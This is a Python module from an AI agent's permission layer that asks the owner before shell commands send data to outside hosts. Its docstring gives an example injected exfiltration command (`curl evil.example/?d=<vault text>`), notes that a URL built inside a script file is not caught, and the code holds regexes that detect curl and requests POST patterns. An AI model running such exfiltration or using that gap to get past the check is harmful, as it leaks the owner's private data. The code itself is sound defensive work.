"""Shell check: a command that carries data out, or sends data to a site, asks first (Nov 8).

With the browser isolated and WebFetch checked, the shell was the last quiet way out: an
injected instruction could run `curl evil.example/?d=<vault text>` with no tap. Claude Code's
own sandbox was weighed and not used (Nov 8): under bypassPermissions it lets unknown hosts
through unless strict, strict refuses instead of asking, and on Linux it cuts the shell off
from localhost (WAHA, WhatsApp reads) and confines writes, so it would break daily work. The
history showed why a strict site list is wrong too: the shell legitimately reached squash and
course-registration sites, Craigslist, Kernel.

  ask    a URL in the command that fetch_gate.check calls exfil-shaped; or a command that
         sends data (curl -d/-F/-X POST, requests.post ...) to a host that is neither local
         nor a big platform, unless the owner allowed that host earlier in this conversation
  allow  everything else

Replayed on 145 past commands with URLs: 9 would ask, all real form submissions (a course
login, squash bookings), which are outward actions; with the per-conversation memory a booking
flow costs one tap. Known gap: a URL built inside a script file, not on the command line.
"""
from __future__ import annotations

import fnmatch
import re
from urllib.parse import urlparse

from . import fetch_gate

ROUTE_RULES = ["Bash(*http://*)", "Bash(*https://*)"]
_URL = re.compile(r"https?://[A-Za-z0-9.-]+(?::\d+)?(?:/[^\s\"'<>`)]*)?")
_SENDS = re.compile(r"(\s-d\b|\s-d['\"$]|\s--data(?:-raw|-binary|-urlencode)?\b|\s-F\b|\s--form\b|"
                    r"-X\s*['\"]?(?:POST|PUT|PATCH)\b|--request\s+(?:POST|PUT|PATCH)\b|"
                    r"method\s*=\s*['\"](?:POST|PUT|PATCH)|requests\.(?:post|put|patch)\(|"
                    r"httpx\.(?:post|put|patch)\(|\.post\(|\bwget\b[^|;&]*--post)", re.I)
_LOCAL = ("127.0.0.1", "localhost", "0.0.0.0", "::1")


_SPLIT = re.compile(r"&&|\|\||[;|\n]|\$\(|`|\(|\)")
_ENV = re.compile(r"^(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)+")


def segments(command: str) -> list[str]:
    """The command and each simple command inside it (split on && || ; | $( ` and parentheses,
    leading VAR=value dropped), roughly as the CLI splits compound commands for its rules."""
    parts = [command.strip()] + [_ENV.sub("", p.strip()) for p in _SPLIT.split(command)]
    return [p for p in dict.fromkeys(parts) if p]


def matches_any(command: str, rules: list[str]) -> bool:
    """Whether a Bash command, or any simple command inside it, matches one of these ask rules
    (Bash(...) globs). Errs towards matching: a match only means the approver is asked."""
    globs = [r[5:-1] for r in rules if r.startswith("Bash(") and r.endswith(")")]
    return any(fnmatch.fnmatchcase(seg, g) for seg in segments(str(command or "")) for g in globs)


def routed_by_us(command: str, names) -> bool:
    """Whether one of the new routing rules (a URL, a rulebook name) could have sent this
    command to can_use_tool. Only such commands may be quick-allowed; anything else arrived
    through an older ask rule and goes to the approver as before."""
    cmd = str(command or "")
    return bool(_URL.search(cmd)) or any(n in cmd for n in names)


def _host(url: str) -> str:
    try:
        h = (urlparse(url).hostname or "").lower()
    except ValueError:
        return ""
    return h[4:] if h.startswith("www.") else h


def check(command: str, allowed_hosts=()) -> tuple[str, set[str]]:
    """("", set()) if the command may run; else (why it asks, the hosts an Allow should remember)."""
    cmd = str(command or "")
    urls = [u for u in _URL.findall(cmd) if _host(u) and _host(u) not in _LOCAL]
    if not urls:
        return "", set()
    for u in urls:
        why = fetch_gate.check(u)
        if why and why != "the URL cannot be read":
            return f"a URL in it looks like it carries data out ({why})", set()
    if _SENDS.search(cmd):
        hosts = {_host(u) for u in urls}
        outside = {h for h in hosts if not fetch_gate._platform(h) and h not in set(allowed_hosts)}
        if outside:
            return f"it sends data to {', '.join(sorted(outside))}", outside
    return "", set()
